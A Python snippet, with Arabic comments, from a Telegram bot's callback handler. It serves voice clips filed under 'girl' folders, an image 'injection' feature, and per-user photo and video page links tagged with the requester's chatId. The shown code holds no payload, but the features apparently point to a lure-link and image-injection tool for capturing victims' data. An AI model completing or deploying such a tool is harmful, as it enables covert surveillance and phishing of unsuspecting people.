# --- تحديث دالة handle_query لتشمل الصوتيات ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db() # تحميل البيانات

    if call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
    
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
            types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
            types.InlineKeyboardButton("🔙 عودة", callback_data="main_menu")
        )
        bot.edit_message_text("اختر المجلد:", chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup)

    elif call.data == "girl_1_menu":
        user_states[chat_id] = "active_girl_1"
        markup = types.InlineKeyboardMarkup(row_width=2)
        girl_db = db.get("girl_1", {})
        for i in range(1, 11):
            name = f"مقطع {i}"
            status = "🎵" if name in girl_db else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status} {name}", callback_data=f"play_g1:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مجلد الفتاة 1:", chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup)

    elif call.data == "girl_2_menu":
        user_states[chat_id] = "active_girl_2"
        markup = types.InlineKeyboardMarkup(row_width=2)
        girl_db = db.get("girl_2", {})
        for i in range(1, 14):
            name = f"مقطع {i}"
            status = "🎵" if name in girl_db else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status} {name}", callback_data=f"play_g2:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مجلد الفتاة 2:", chat_id=chat_id, message_id=call.message.message_id, reply_markup=markup)

    # --- معالجة الأزرار الأخرى (الروابط والحقن) ---
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.send_message(chat_id, "📸 أرسل الصورة:")
    elif call.data == "get_photo_link":
        bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link":
        bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link":
        bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    
    # معالجة تشغيل الصوت
    elif call.data.startswith("play_g1:"):
        name = call.data.split(":")[1]
        file_id = db.get("girl_1", {}).get(name)
        if file_id: bot.send_voice(chat_id, file_id)
        else: bot.answer_callback_query(call.id, "⚠️ فارغ!")
        
    bot.answer_callback_query(call.id)
